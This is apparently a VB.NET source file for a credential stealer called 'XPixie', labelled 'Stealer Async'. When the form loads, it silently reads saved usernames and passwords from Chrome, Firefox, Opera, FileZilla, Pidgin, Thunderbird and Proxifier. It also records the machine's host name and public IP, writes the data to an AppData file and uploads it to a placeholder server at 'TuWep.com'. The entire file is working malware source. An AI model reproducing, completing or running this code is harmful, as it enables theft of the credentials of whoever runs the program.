Imports System.IO
Imports System.Net

Public Class Form1

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        InicioIPixie()
    End Sub

    
#Region "XPixie"

    Private Sub InicioIPixie()
        If My.Computer.FileSystem.FileExists(directorio) = True Then
            My.Computer.FileSystem.DeleteFile(directorio)
        End If
        Dim tsk As New Task(act, TaskCreationOptions.LongRunning)
        tsk.Start()
    End Sub

#Region "Stealer Async"

    Public Datas As String = String.Empty
    Public Finalice As Boolean = False
    Public namepc As String = Gethotsname()
    Public directorio As String = GetAppDataPath() & "\" & namepc

    Private Sub UploadAsync(ByVal url As String, ByVal FiletPath As String)
        Dim clien As New WebClient
        clien.UploadFileAsync(New Uri(url), FiletPath)
    End Sub

    Function GetAppDataPath() As String
        Return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
    End Function

    Private Sub XPixieS_Tick(sender As Object, e As EventArgs) Handles XPixieS.Tick
        If Finalice = True Then
            Dim objStreamWriter As StreamWriter
            objStreamWriter = New StreamWriter(directorio)
            objStreamWriter.WriteLine("Create By XPixie")
            objStreamWriter.WriteLine("")
            objStreamWriter.WriteLine(Datas)
            objStreamWriter.Close()
            UploadAsync("https://TuWep.com/upload.php", directorio)
            XPixieS.Enabled = False
        End If
    End Sub

    Dim act As New Action(
        Sub()
            Dim zez As New SiriTDecrypt
            Datas = GetIPAddress() & vbNewLine
            zez.ReadAllInfos().ForEach(Sub(w)
                                           Dim data As String = (String.Concat("Navegador : " & w.ap, "  ", "Page : " & w.ur, "  ", "User : " & w.ac, "  ", "Pass : " & w.pa))
                                           Datas = Datas & vbNewLine & data
                                       End Sub)
            PassRecover()
        End Sub)

    Public Function Gethotsname() As String
        Dim strHostName As String = System.Net.Dns.GetHostName()
        Return strHostName
    End Function

    Public Function GetIPAddress() As String
        Dim uri_val As New Uri("https://TuWep.com/curip.php")
        Dim request As HttpWebRequest = HttpWebRequest.Create(uri_val)

        request.Method = WebRequestMethods.Http.Get

        Dim response As HttpWebResponse = request.GetResponse()
        Dim reader As New StreamReader(response.GetResponseStream())
        Dim myIP As String = reader.ReadToEnd()

        response.Close()

        Return "Real IP Address: " & myIP
    End Function

    Private Sub PassRecover()
        For Each Drive As DriveInfo In DriveInfo.GetDrives
            If Drive.RootDirectory.FullName = "C:\" Then
                Dim x As New PREC(Drive)
                With x
                    .RecoverChrome()
                    .RecoverFileZilla()
                    .RecoverFirefox()
                    .RecoverOpera()
                    .RecoverPidgin()
                    .RecoverThunderbird()
                    .RecoverProxifier()
                End With
                For Each A As Account In x.Accounts
                    Datas = Datas & vbNewLine & A.ToString()
                Next
            End If
        Next
        Finalice = True
    End Sub

#End Region

#End Region

End Class
